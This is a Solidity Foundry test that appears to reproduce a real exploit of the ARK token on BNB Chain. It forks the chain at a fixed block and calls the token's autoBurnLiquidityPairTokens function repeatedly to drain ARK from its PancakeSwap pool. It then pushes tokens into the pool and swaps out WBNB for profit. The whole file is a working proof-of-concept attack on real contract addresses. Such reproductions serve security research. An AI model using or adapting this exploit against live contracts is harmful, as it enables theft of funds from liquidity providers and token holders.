// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";
import "@interface/IWBNB.sol";
import "@interface/IPancakeV2.sol";

import "./IArk.sol";

IWBNB constant WBNB = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
IArk constant ARK = IArk(0xde698B5BBb4A12DDf2261BbdF8e034af34399999);
IPancakePairV2 constant BNB_ARK_Pool = IPancakePairV2(
    0xc0F54B8755DAF1Fd78933335EfCD761e3D5B4a6F
);
IPancakeRouterV2 constant router = IPancakeRouterV2(
    payable(0x10ED43C718714eb63d5aA57B78B54704E256024E)
);

contract ArkTest is Test {
    function setUp() external {
        vm.createSelectFork("bsc", 37221235);
        // explotier have
        deal(address(WBNB), address(this), 100);
        deal(address(ARK), address(this), 4 ether);
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() external {
        print("[Begin] WBNB", WBNB.balanceOf(address(this)), 18);
        uint i = 0;
        while (i < 10000) {
            ARK.autoBurnLiquidityPairTokens();
            if (ARK.balanceOf(address(BNB_ARK_Pool)) < 1700000000000) {
                break;
            }
            i++;
        }

        WBNB.transfer(address(BNB_ARK_Pool), 100);
        ARK.transfer(address(BNB_ARK_Pool), ARK.balanceOf(address(this)));

        (uint256 r0, uint256 r1, ) = BNB_ARK_Pool.getReserves();
        print("r0", r0, 18);
        print("r1", r1, 18);

        uint256 Ark_balance = ARK.balanceOf(address(BNB_ARK_Pool));
        print("Ark_balance", Ark_balance, 18);

        address[] memory path = new address[](2);
        path[0] = address(ARK);
        path[1] = address(WBNB);
        uint256[] memory amountOut = router.getAmountsOut(
            // 这个才是真实的Ark输入量
            Ark_balance - r1,
            path
        );
        print("amountOut[0]", amountOut[0], 18);
        print("amountOut[1]", amountOut[1], 18);

        BNB_ARK_Pool.swap(amountOut[1], 0, address(this), "");
        print("[End] WBNB", WBNB.balanceOf(address(this)), 18);
    }
}
